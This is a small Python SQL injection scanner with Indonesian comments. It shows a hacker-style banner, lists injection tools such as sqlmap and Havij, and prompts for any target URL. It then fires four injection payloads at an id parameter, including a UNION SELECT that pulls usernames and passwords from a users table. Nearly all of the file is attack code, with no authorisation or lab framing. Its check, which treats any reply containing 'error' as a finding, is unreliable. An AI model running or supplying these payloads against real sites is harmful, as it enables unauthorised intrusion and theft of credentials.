import requests
import os

# Daftar payload SQL Injection
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' UNION SELECT null, username, password FROM users --",
]

def display_tools():
    # Menampilkan logo dengan warna hijau muda
    print("\033[92m" + ".----------------.  .----------------.   .----------------.  .----------------.  .----------------.")
    print("| .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. |")
    print("| | ____    ____ | || |  _______     | | |    _______   | || |  ___  ____   | || |  ___  ____   | |")
    print("| ||_   \\  /   _|| || | |_   __ \\    | | |   /  ___  |  | || | |_  ||_  _|  | || | |_  ||_  _|  | |")
    print("| |  |   \\/   |  | || |   | |__) |   | | |  |  (__ \\_|  | || |   | |_/ /    | || |   | |_/ /    | |")
    print("| |  | |\\  /| |  | || |   |  __ /    | | | |   '.___`-.   | || |   |  __'.    | || |   |  __'.    | |")
    print("| | _| |_\\/| |_ | || |  _| |  \\ \\_  | | | |  |`\\____) |  | || |  _| |  \\ \\_  | || |  _| |  \\ \\_  | |")
    print("| ||_____||_____|| || | |____| |___| | | | |  |_______.'  | || | |____||____| | || | |____||____| | |")
    print("| |              | || |              | | | |              | || |              | || |              | |")
    print("| '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' |")
    print(" '----------------'  '----------------'   '----------------'  '----------------'  '----------------' " + "\033[0m")

    print("\nTools:")
    print("1. SQLMap: https://github.com/sqlmapproject/sqlmap")
    print("2. Havij: https://www.itsecteam.com/tools/havij/")
    print("3. jSQL: http://jsql.sourceforge.net/")
    print("4. Pip3: https://pypi.org/project/sqlmap/")

def test_sql_injection(url):
    for payload in payloads:
        # Mengganti parameter di URL dengan payload
        injection_url = f"{url}?id={payload}"
        try:
            response = requests.get(injection_url)
            if "error" in response.text.lower():
                print(f"[!] Ditemukan potensi SQL Injection pada: {injection_url}")
            else:
                print(f"[+] Tidak ada kerentanan ditemukan pada: {injection_url}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Terjadi kesalahan: {e}")

if __name__ == "__main__":
    display_tools()
    target_url = input("Masukkan URL target: ")
    test_sql_injection(target_url)
